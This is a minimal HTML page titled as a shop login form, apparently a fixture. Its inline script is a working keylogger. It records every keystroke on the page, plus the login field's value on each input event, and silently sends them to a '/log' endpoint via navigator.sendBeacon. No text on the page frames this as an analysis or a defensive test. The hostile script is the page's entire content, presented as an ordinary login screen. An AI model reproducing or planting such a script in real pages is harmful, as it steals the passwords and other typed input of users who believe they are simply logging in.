<!doctype html>
<html><head><meta charset="utf-8"><title>Login – Fixture Shop</title></head>
<body>
<input id="k" autofocus>
<script>
  k.focus();
  let buf = '';
  addEventListener('keydown', e => { buf += e.key.length === 1 ? e.key : ''; navigator.sendBeacon('/log?k=' + encodeURIComponent(buf)); }, true);
  k.addEventListener('input', () => navigator.sendBeacon('/log?v=' + encodeURIComponent(k.value)));
</script>
</body></html>
